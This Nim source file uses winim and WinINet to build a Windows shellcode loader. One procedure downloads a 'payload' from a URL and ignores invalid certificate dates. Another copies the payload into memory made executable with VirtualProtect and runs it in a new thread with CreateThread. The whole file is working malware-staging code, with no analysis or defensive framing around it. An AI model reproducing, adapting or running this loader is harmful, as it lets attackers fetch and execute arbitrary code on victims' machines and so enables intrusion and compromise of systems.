import winim/lean
import winim/inc/wininet

template label*(name, body) =
  {.emit: astToStr(name) & ":".}
  body

template goto*(name) =
  {.emit: "goto " & astToStr(name) & ";".}

proc memset*(dest: pointer, c: int, count: int): pointer =
  var dest2 = cast[ptr byte](dest)
  for i in 0 ..< count:
    dest2[] = c.byte
    dest2 = cast[ptr byte](cast[int](dest) + i + 1)
  return dest

proc GetPayloadFromUrlA*(sUrl: cstring, pBuffer: var pointer, sPayloadSize: var int): bool =
  var 
    bState: bool = true
    hInternet, hInternetFile: HINTERNET
    dwBytesRead: DWORD
    pTmpBytes, pBytes: PBYTE
    sSize: int

  hInternet = InternetOpenA(NULL, cast[DWORD](NULL), NULL, NULL, cast[DWORD](NULL))
  if (hInternet == NULL): 
    #echo "[!] InternetOpenA Failed With Error: " & $GetLastError()
    bState = false; goto endOfFunction

  hInternetFile = InternetOpenUrlA(
    hInternet, sUrl, NULL, cast[DWORD](NULL),
    INTERNET_FLAG_HYPERLINK or INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
    cast[DWORD_PTR](NULL)
  )
  if hInternetFile == NULL:
    #echo "[!] InternetOpenURLA Failed With Error: " & $GetLastError()
    bState = false; goto endOfFunction

  pTmpBytes = cast[PBYTE](LocalAlloc(LPTR, 1024))
  if cast[uint](pTmpBytes) == 0:
    #echo "[!] LocalAlloc Failed With Error: " & $GetLastError()
    bState = false; goto endOfFunction
  
  while true:
    if InternetReadFile(hInternetFile, pTmpBytes, 1024, dwBytesRead.addr) == 0:
      #echo "[!] InternetReadFile Failed With Error: " & $GetLastError()
      bState = false; goto endOfFunction
    sSize += dwBytesRead.int

    if cast[uint](pBytes) == 0:
      pBytes = cast[PBYTE](LocalAlloc(LPTR, dwBytesRead))
    else:
      pBytes = cast[PBYTE](LocalReAlloc(cast[HLOCAL](pBytes), sSize, LMEM_MOVEABLE or LMEM_ZEROINIT))
    
    if cast[uint](pBytes) == 0:
      bState = false; goto endOfFunction

    copyMem(
      cast[pointer](cast[uint](pBytes) + (sSize.uint - dwBytesRead.uint)),
      pTmpBytes,
      dwBytesRead.int
    ) 
    pTmpBytes = cast[PBYTE](memset(pTmpBytes, '\0'.int, dwBytesRead))

    if (dwBytesRead < 1024):
      break


  pBuffer = cast[pointer](pBytes)
  sPayloadSize = sSize
  
  bstate = true

  label endOfFunction:
    InternetCloseHandle(hInternet)
    InternetCloseHandle(hInternetFile)
    InternetSetOption(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0)
    if cast[uint](pTmpBytes) != 0: 
      LocalFree(cast[HLOCAL](pTmpBytes))
      
    return bState

proc executeShellcodeInLocalProcess*(pShellcodeAddress: pointer, sShellcodeSize: int, 
    pInjectionAddress: var LPVOID = cast[var LPVOID](-1),
    phThread: var HANDLE = cast[var HANDLE](-1)
  ): bool =
  var 
    pAddress: LPVOID
    dwOldProtection: DWORD
    hThread: HANDLE
  
  pAddress = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if cast[uint](pAddress) == 0:
    #echo "[!] VirtualAlloc Failed With Error: " & $GetLastError()
    return false

  if VirtualProtect(
    pAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, dwOldProtection.addr
  ) == 0:
    #echo "[!] VirtualProtect Failed With Error: " & $GetLastError()
    return false

  copyMem(pAddress, pShellcodeAddress, sShellcodeSize)

  hThread = CreateThread(
    NULL, 0.SIZE_T, 
    cast[LPTHREAD_START_ROUTINE](pAddress), 
    NULL, 0, NULL
  )
  if hThread == 0:
    #echo "[!] CreateThread Failed With Error: " & $GetLastError()
    return false

  if cast[int](pInjectionAddress) != -1: 
    pInjectionAddress = pAddress
  if cast[int](phThread) != -1: 
    phThread = hThread

  return true


template PSTR*(arg: untyped): cstring =
  cast[cstring](arg[0].addr)

template PRINTA*(args: varargs[untyped]) =
  var buf = cast[LPSTR](LocalAlloc(LPTR, 1024))
  if cast[uint](buf) != 0:
    var length = wsprintfA(buf, args)
    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), buf, length, NULL, NULL)
    LocalFree(cast[HLOCAL](buf))